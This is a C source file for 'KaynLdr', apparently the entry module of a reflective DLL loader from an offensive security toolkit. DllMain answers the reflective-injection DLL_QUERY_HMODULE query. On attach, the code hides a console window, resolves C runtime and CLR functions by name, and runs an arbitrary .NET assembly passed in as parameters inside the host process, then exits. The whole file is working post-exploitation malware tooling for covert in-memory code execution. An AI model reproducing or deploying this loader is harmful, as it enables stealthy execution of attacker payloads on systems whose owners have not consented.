/**
 * KaynLdr
 * Author: Paul Ungur (@C5pider)
 */

#include <KaynLdr.h>
#include <stdio.h>
#include <InvokeAssembly.h>

HINSTANCE   hAppInstance = NULL;
INSTANCE    Instance     = { 0 };
HANDLE      g_hPipeOut   = NULL;
HANDLE      g_hPipeErr   = NULL;

BOOL WINAPI DllMain( HINSTANCE hInstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

    switch( dwReason )
    {
        case DLL_QUERY_HMODULE:
            if( lpReserved != NULL )
                *( HMODULE* ) lpReserved = hAppInstance;
            break;

		case DLL_PROCESS_ATTACH:
		{
			hAppInstance = hInstDLL;

            ModuleInit();
            ModuleMain( lpReserved );

			fflush( stdout );
			fflush( stderr );
			{
				HANDLE h = GetStdHandle( (DWORD)-11 );
				if ( h && h != INVALID_HANDLE_VALUE )
					FlushFileBuffers( h );
			}
			ExitProcess( 0 );
		}

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}

VOID ModuleInit()
{
    HANDLE hPipeOut = GetStdHandle( (DWORD)-11 );
    HANDLE hPipeErr = GetStdHandle( (DWORD)-12 );

    if ( ! GetConsoleWindow() )
    {
        AllocConsole();
        HWND wnd = GetConsoleWindow();
        if ( wnd )
            ShowWindow( wnd, 0 );
    }

    if ( hPipeOut && hPipeOut != INVALID_HANDLE_VALUE )
        SetStdHandle( (DWORD)-11, hPipeOut );
    if ( hPipeErr && hPipeErr != INVALID_HANDLE_VALUE )
        SetStdHandle( (DWORD)-12, hPipeErr );

    g_hPipeOut = hPipeOut;
    g_hPipeErr = hPipeErr;

    Instance.Modules.Msvcrt = LoadLibraryA( "Msvcrt" );
    if ( Instance.Modules.Msvcrt )
    {
        Instance.Win32.printf = GetProcAddress( Instance.Modules.Msvcrt, "printf" );

        typedef int  (__cdecl *fn_open_osfhandle)( intptr_t, int );
        typedef int  (__cdecl *fn_dup2)( int, int );
        typedef void (__cdecl *fn_setmode)( int, int );

        fn_open_osfhandle p_open  = (fn_open_osfhandle) GetProcAddress( Instance.Modules.Msvcrt, "_open_osfhandle" );
        fn_dup2           p_dup2  = (fn_dup2)           GetProcAddress( Instance.Modules.Msvcrt, "_dup2" );
        fn_setmode        p_setm = (fn_setmode)        GetProcAddress( Instance.Modules.Msvcrt, "_setmode" );

        if ( p_open && p_dup2 )
        {
            HANDLE hOut = GetStdHandle( (DWORD)-11 );
            HANDLE hErr = GetStdHandle( (DWORD)-12 );

            if ( hOut && hOut != INVALID_HANDLE_VALUE )
            {
                int fd = p_open( (intptr_t) hOut, 0x0001 );
                if ( fd >= 0 )
                {
                    p_dup2( fd, 1 );
                    if ( p_setm ) p_setm( 1, 0x4000 );
                }
            }
            if ( hErr && hErr != INVALID_HANDLE_VALUE )
            {
                int fd = p_open( (intptr_t) hErr, 0x0001 );
                if ( fd >= 0 )
                {
                    p_dup2( fd, 2 );
                    if ( p_setm ) p_setm( 2, 0x4000 );
                }
            }
        }
    }

    Instance.Modules.Mscoree = LoadLibraryA( "Mscoree" );
    if ( Instance.Modules.Mscoree )
    {
        Instance.Win32.CLRCreateInstance = GetProcAddress( Instance.Modules.Mscoree, "CLRCreateInstance" );
    }
}

VOID ModuleMain( PVOID Params )
{
    PARSER Parser = { 0 };
    ParserNew( &Parser, Params );

    InvokeAssembly( &Parser );
}